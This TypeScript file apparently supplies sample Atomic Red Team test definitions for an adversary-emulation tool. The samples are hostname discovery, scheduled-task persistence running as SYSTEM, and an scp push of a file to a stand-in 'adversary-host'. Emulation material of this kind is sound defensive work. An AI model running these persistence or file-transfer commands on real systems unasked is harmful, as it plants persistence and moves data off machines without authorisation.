/**
 * Bundled sample ART YAML bodies for the "Load Sample" dropdown.
 *
 * These are bare single-test YAMLs (no technique wrapper) — the upload-yaml
 * path will treat them as a single test and apply technique metadata of
 * `null` for the user to fill in via TechniquePicker.
 */

import type { AtomicYamlInput } from "@/lib/use-cases/types";
import { baseAtomic } from "./schema";

export interface AtomicSample {
  id: string;
  label: string;
  techniqueId: string;
  techniqueName: string;
  build: () => AtomicYamlInput;
}

export const SAMPLES: AtomicSample[] = [
  {
    id: "hostname-windows",
    label: "Hostname Discovery (Windows)",
    techniqueId: "T1082",
    techniqueName: "System Information Discovery",
    build: () => ({
      ...baseAtomic,
      attack_technique: "T1082",
      display_name: "System Information Discovery",
      name: "Hostname Discovery (Windows)",
      description: "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.",
      supported_platforms: ["windows"],
      input_arguments: [],
      dependency_executor_name: "",
      dependencies: [],
      executor: {
        name: "command_prompt",
        command: "hostname\n",
        cleanup_command: null,
        elevation_required: false,
        steps: null,
      },
      auto_generated_guid: null,
    }),
  },
  {
    id: "schtasks-startup",
    label: "Scheduled Task Startup Script",
    techniqueId: "T1053.005",
    techniqueName: "Scheduled Task/Job: Scheduled Task",
    build: () => ({
      ...baseAtomic,
      attack_technique: "T1053.005",
      display_name: "Scheduled Task/Job: Scheduled Task",
      name: "Scheduled Task Startup Script",
      description:
        "Run an exe on user logon or system startup. Upon execution, success messages will be displayed for the two scheduled tasks. To view the tasks, open the Task Scheduler and look in the Active Tasks pane.",
      supported_platforms: ["windows"],
      input_arguments: [],
      dependency_executor_name: "",
      dependencies: [],
      executor: {
        name: "command_prompt",
        command:
          'schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"\n' +
          'schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"\n',
        cleanup_command:
          'schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1\n' +
          'schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1\n',
        elevation_required: true,
        steps: null,
      },
      auto_generated_guid: null,
    }),
  },
  {
    id: "scp-push-file",
    label: "Push file using scp.exe (Windows)",
    techniqueId: "T1105",
    techniqueName: "Ingress Tool Transfer",
    build: () => ({
      ...baseAtomic,
      attack_technique: "T1105",
      display_name: "Ingress Tool Transfer",
      name: "Windows push file using scp.exe",
      description: "This test simulates pushing files using SCP on a Windows environment.",
      supported_platforms: ["windows"],
      input_arguments: [
        { name: "username",    type: "string", description: "User account to authenticate on remote host", default: "adversary" },
        { name: "file_name",   type: "string", description: "Name of the file to transfer",                  default: "T1105.txt" },
        { name: "local_path",  type: "path",   description: "Local path to copy from",                        default: "C:\\temp" },
        { name: "remote_host", type: "string", description: "Remote host to send",                            default: "adversary-host" },
        { name: "remote_path", type: "path",   description: "Path of folder to copy",                         default: "/tmp/" },
      ],
      dependency_executor_name: "powershell",
      dependencies: [
        {
          description: "This test requires the `scp` command to be available on the system.",
          prereq_command:
            "if (Get-Command scp -ErrorAction SilentlyContinue) {\n" +
            '    Write-Output "SCP command is available."\n' +
            "    exit 0\n" +
            "} else {\n" +
            '    Write-Output "SCP command is not available."\n' +
            "    exit 1\n" +
            "}",
          get_prereq_command:
            '$capabilityName = "OpenSSH.Client~~~~0.0.1.0"\n' +
            "try {\n" +
            "    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n" +
            '    Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green\n' +
            "} catch {\n" +
            '    Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red\n' +
            "}",
        },
      ],
      executor: {
        name: "powershell",
        command:
          '$folderPath = "#{local_path}"\n' +
          "if (-Not (Test-Path -Path $folderPath)) { New-Item -Path $folderPath -ItemType Directory }\n" +
          '$filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"\n' +
          "New-Item -Path $filePath -ItemType File -Force\n" +
          'Write-Output "File created: $filePath"\n' +
          "scp.exe #{local_path}\\#{file_name} #{username}@#{remote_host}:#{remote_path}\n",
        cleanup_command:
          '$filePath = Join-Path -Path "#{local_path}" -ChildPath "#{file_name}"\n' +
          "Remove-Item -Path $filePath -Force -erroraction silentlycontinue\n" +
          'Write-Output "File deleted: $filePath"\n',
        elevation_required: true,
        steps: null,
      },
      auto_generated_guid: null,
    }),
  },
];
